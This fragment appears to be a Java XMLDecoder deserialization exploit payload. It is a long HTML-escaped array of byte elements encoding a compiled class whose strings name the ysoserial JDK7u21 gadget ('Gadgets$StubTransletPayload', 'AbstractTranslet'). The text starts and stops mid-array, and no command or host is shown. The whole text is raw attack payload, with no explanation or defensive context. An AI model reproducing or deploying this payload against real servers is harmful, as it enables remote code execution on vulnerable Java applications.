&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1172"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1173"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1174"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1175"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1176"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="1177"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1178"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1179"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1180"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1181"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="1182"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1183"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1184"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1185"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1186"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1187"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1188"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1189"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1190"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1192"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="1193"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1194"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1195"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1196"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1197"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1198"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1199"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1200"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1202"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1203"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="1204"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1205"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1206"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1207"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1208"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1209"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1210"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1211"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1212"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1213"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1214"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1215"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1216"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1217"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1218"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1219"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1220"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1221"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1222"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1223"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1224"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1225"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1226"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1227"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1228"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1229"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1230"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1231"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1232"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1233"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1234"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1235"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1236"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1237"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1238"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1239"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1240"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1241"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1242"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1243"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="1244"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1245"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1246"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1247"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1248"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1249"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1250"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1251"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1252"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1253"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1254"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="1255"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1256"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1257"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1258"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1259"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1260"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="1261"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1262"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1263"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1264"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1265"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1266"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1267"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="1268"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1270"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="1271"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1272"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1273"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1274"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1275"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1276"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1277"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="1278"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1279"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1280"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1281"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1283"&gt; &lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="1284"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="1285"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1286"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="1287"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="1288"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1289"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="1290"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="1291"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="1292"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1293"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1294"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1295"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1296"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="1297"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="1298"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1299"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1300"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1301"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="1302"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="1303"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1304"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1305"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1306"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1307"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="1308"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1309"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1310"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1311"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="1312"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1313"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1314"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1315"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1316"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1317"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="1319"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="1321"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="1322"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="1324"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="1325"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1327"&gt; &lt;byte&gt;35&lt;/byte&gt;&lt;/void&gt;&lt;void index="1328"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="1329"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="1330"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="1331"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="1332"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1333"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="1334"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="1335"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1336"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="1337"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1338"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1339"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1340"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1341"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1342"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1343"&gt; &lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="1344"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1345"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1346"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1347"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1348"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1349"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1350"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1351"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1352"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1353"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1354"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1355"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1356"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="1357"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1358"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="1359"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1360"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1361"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1362"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="1363"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1365"&gt; &lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="1366"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1367"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1368"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1369"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1370"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1371"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1372"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1373"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1374"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1375"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1376"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1377"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1378"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1379"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1380"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1381"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1382"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1383"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1384"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1385"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1386"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1387"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1388"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1389"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1390"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1391"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1392"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1393"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1394"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1395"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1396"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1397"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1398"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1399"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1400"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1401"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1402"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1403"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1404"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1405"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1406"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1407"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1408"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1409"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1410"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1411"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1412"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1413"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1414"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="1415"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1416"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1417"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1418"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1419"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1420"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1421"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1422"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1423"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1424"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1425"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1426"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1427"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1428"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1429"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1430"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1432"&gt; &lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="1433"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="1434"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1435"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="1436"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1437"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1438"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1439"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1440"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1441"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="1442"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1443"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1444"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1445"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1446"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1447"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1448"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="1449"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1450"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="1451"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1452"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1453"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="1455"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="1456"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1457"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1458"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="1459"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1460"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1461"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="1462"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1463"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1464"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="1465"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1466"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="1467"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1468"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1469"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="1470"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1471"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1472"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="1473"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1474"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1475"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1476"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1477"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1478"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1479"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1480"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1481"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="1482"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1483"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1484"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1485"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1486"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1487"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1488"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1489"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1490"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1491"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1492"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1493"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1494"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1495"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="1496"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1497"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="1498"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="1499"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="1500"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="1501"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="1502"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1503"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="1504"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="1505"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="1506"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="1507"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="1508"&gt; 